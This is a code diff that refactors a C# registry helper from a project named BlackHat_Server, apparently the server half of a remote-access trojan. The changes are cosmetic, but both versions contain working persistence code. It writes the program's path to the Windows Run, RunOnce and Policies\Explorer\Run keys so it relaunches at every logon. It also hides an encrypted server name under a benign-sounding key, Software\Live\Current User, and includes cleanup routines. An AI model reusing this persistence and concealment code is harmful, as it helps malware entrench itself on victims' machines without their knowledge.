@@ -1,41 +1,36 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Text;
 using Microsoft.Win32;
 
 namespace BlackHat_Server
 {
-    class RegistryManager
+    internal class RegistryManager
     {
-
         #region SERVER NAME
+
         /// <summary>
-        /// Controlla se esiste il ket sul registro del
-        /// nome server
+        ///     Controlla se esiste il ket sul registro del
+        ///     nome server
         /// </summary>
         /// <returns></returns>
         public bool ExistServerNameEntry()
         {
             try
             {
-                RegistryKey rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
+                var rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
 
                 if (rk_Check == null)
                     return false;
-                else
-                    return true;
-
+                return true;
             }
             catch
             {
                 return false;
             }
-
         }
         //-------------------------------------------------------
 
         /// <summary>
-        /// Setta il nuovo valore sul registro
+        ///     Setta il nuovo valore sul registro
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -44,7 +39,7 @@ namespace BlackHat_Server
             try
             {
                 // CONTROLLO ESISTENZA DELLA CHIAVE
-                RegistryKey rk_Check = Registry.CurrentUser.CreateSubKey(@"Software\Live\Current User");
+                var rk_Check = Registry.CurrentUser.CreateSubKey(@"Software\Live\Current User");
 
 
                 rk_Check.SetValue("User", newNameCrypted, RegistryValueKind.ExpandString);
@@ -57,14 +52,12 @@ namespace BlackHat_Server
             {
                 return false;
             }
-
-
         }
         //---------------------------------------------------------
 
         /// <summary>
-        /// Get il nome dal registro
-        /// null se non esiste o errore
+        ///     Get il nome dal registro
+        ///     null se non esiste o errore
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -73,28 +66,25 @@ namespace BlackHat_Server
             try
             {
                 // CONTROLLO ESISTENZA DELLA CHIAVE
-                RegistryKey rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
+                var rk_Check = Registry.CurrentUser.OpenSubKey(@"Software\Live\Current User");
 
                 if (rk_Check == null)
                     return null;
-                else
-                    return rk_Check.GetValue("User").ToString();
+                return rk_Check.GetValue("User").ToString();
             }
             catch
             {
                 return null;
             }
-
-
         }
         //---------------------------------------------------------
-        
+
         #endregion
 
         #region INSTALLATION
 
         /// <summary>
-        /// HKCU RUNONCE ENTRY
+        ///     HKCU RUNONCE ENTRY
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -102,28 +92,26 @@ namespace BlackHat_Server
         {
             try
             {
-                RegistryKey rk = Registry.CurrentUser;
+                var rk = Registry.CurrentUser;
                 RegistryKey StartupPath;
                 StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
 
                 // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
-                if (StartupPath.GetValue(@regEntryName) == null || StartupPath.GetValue(@regEntryName).ToString() != filePath)
-                    StartupPath.SetValue(@regEntryName, filePath, RegistryValueKind.ExpandString);
+                if (StartupPath.GetValue(regEntryName) == null ||
+                    StartupPath.GetValue(regEntryName).ToString() != filePath)
+                    StartupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
 
                 return true;
             }
             catch
             {
                 return false;
-
             }
-
-
         }
         //---------------------------------------------------------
 
         /// <summary>
-        /// HKCU ENTRY
+        ///     HKCU ENTRY
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -131,28 +119,27 @@ namespace BlackHat_Server
         {
             try
             {
-                RegistryKey rk = Registry.CurrentUser;
+                var rk = Registry.CurrentUser;
                 RegistryKey StartupPath;
                 StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
 
                 // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
-                if (StartupPath.GetValue(@regEntryName) == null || StartupPath.GetValue(@regEntryName).ToString() != filePath )
-                    StartupPath.SetValue(@regEntryName, filePath, RegistryValueKind.ExpandString);
+                if (StartupPath.GetValue(regEntryName) == null ||
+                    StartupPath.GetValue(regEntryName).ToString() != filePath)
+                    StartupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
 
                 return true;
             }
             catch
             {
-                return false;   
+                return false;
             }
-                
-            
         }
         //---------------------------------------------------------
 
-        
+
         /// <summary>
-        /// Explorer ENTRY
+        ///     Explorer ENTRY
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -160,31 +147,28 @@ namespace BlackHat_Server
         {
             try
             {
-                RegistryKey rk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run");                               
+                var rk = Registry.CurrentUser.CreateSubKey(
+                    @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run");
 
                 // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
-                if (rk.GetValue(@regEntryName) == null || rk.GetValue(@regEntryName).ToString() != filePath)
-                    rk.SetValue(@regEntryName, filePath, RegistryValueKind.ExpandString);
+                if (rk.GetValue(regEntryName) == null || rk.GetValue(regEntryName).ToString() != filePath)
+                    rk.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
 
                 return true;
-            
             }
-            catch 
+            catch
             {
                 return false;
             }
-           
         }
         //---------------------------------------------------------
 
-
-
-        
         #endregion
 
         #region UNINSTALL
-         /// <summary>
-        /// HKCU ENTRY DELETE
+
+        /// <summary>
+        ///     HKCU ENTRY DELETE
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -192,28 +176,24 @@ namespace BlackHat_Server
         {
             try
             {
-                RegistryKey rk = Registry.CurrentUser;
+                var rk = Registry.CurrentUser;
                 RegistryKey StartupPath;
                 StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
 
                 // LOELIMINO SOLO SE è PUNTA A ME
-                if (StartupPath.GetValue(@regEntryName).ToString() == filePath)
-                    StartupPath.DeleteValue(@regEntryName);
+                if (StartupPath.GetValue(regEntryName).ToString() == filePath)
+                    StartupPath.DeleteValue(regEntryName);
             }
             catch (Exception ex)
             {
-                string exc = ex.Message;
+                var exc = ex.Message;
             }
-           
-            
         }
         //---------------------------------------------------------
 
 
-
-
         /// <summary>
-        /// Explorer ENTRY DELETE
+        ///     Explorer ENTRY DELETE
         /// </summary>
         /// <param name="regEntryName"></param>
         /// <param name="filePath"></param>
@@ -221,29 +201,21 @@ namespace BlackHat_Server
         {
             try
             {
-
-                RegistryKey rk = Registry.CurrentUser;
+                var rk = Registry.CurrentUser;
                 RegistryKey StartupPath;
                 StartupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
 
-                
-                if (StartupPath.GetValue(@regEntryName).ToString() == filePath)
-                    StartupPath.DeleteValue(@regEntryName);
 
+                if (StartupPath.GetValue(regEntryName).ToString() == filePath)
+                    StartupPath.DeleteValue(regEntryName);
             }
             catch (Exception ex)
             {
-                string exc = ex.Message;
+                var exc = ex.Message;
             }
-
         }
         //---------------------------------------------------------
 
-
-
-
         #endregion
-
-
     }
 }
